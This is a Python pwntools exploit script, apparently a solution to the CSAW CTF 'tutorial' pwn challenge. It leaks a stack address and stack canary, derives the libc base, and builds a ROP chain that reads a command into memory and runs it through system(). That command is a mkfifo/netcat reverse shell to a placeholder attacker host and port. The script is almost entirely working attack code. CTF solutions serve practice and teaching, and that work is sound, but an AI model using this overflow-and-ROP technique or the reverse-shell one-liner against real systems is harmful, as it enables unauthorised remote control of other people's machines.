from pwn import *
import re
import time
context(arch='amd64')


REVERSE_HOST = "XXX.XXX.XXX.XXX"
REVERSE_PORT = XXXX

elf = ELF('./tutorial')
libc = ELF('./libc-2.19.so')

#r = remote('192.168.13.226', 8002)
r = remote('pwn.chal.csaw.io', 8002)

buffer = "A"*312

def get_addr():
    r.sendline('1')
    resp = r.recvuntil('>')
    addr = int(re.findall(r'Reference:0x(.*)', resp)[0], 16)
    return addr

def get_canary():
    r.sendline('2')
    r.recvuntil('>')

    r.send(buffer)
    resp = r.recvuntil('>')
    canary = resp[len(buffer):len(buffer) + 8]
    return canary

r.recvuntil('>')
addr = get_addr()
print "[~] Stack addr", hex(addr)
canary = get_canary()

read = addr + 0x7BE40
print "[~] Address of read",hex(read)

libc.address = read - libc.symbols['read']
rop = ROP(libc)

cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {REVERSE_HOST} {REVERSE_PORT} >/tmp/f\x00".format(REVERSE_HOST=REVERSE_HOST, REVERSE_PORT=REVERSE_PORT)
cmd_addr = 0x0000000000602090

rop.read(4, cmd_addr, len(cmd))
rop.system(cmd_addr)

print rop.dump()
exploit = buffer + canary + 'B'*8
exploit += str(rop)

r.sendline('2')
r.recvuntil('>')
r.send(exploit)
time.sleep(.5)
r.send(cmd)
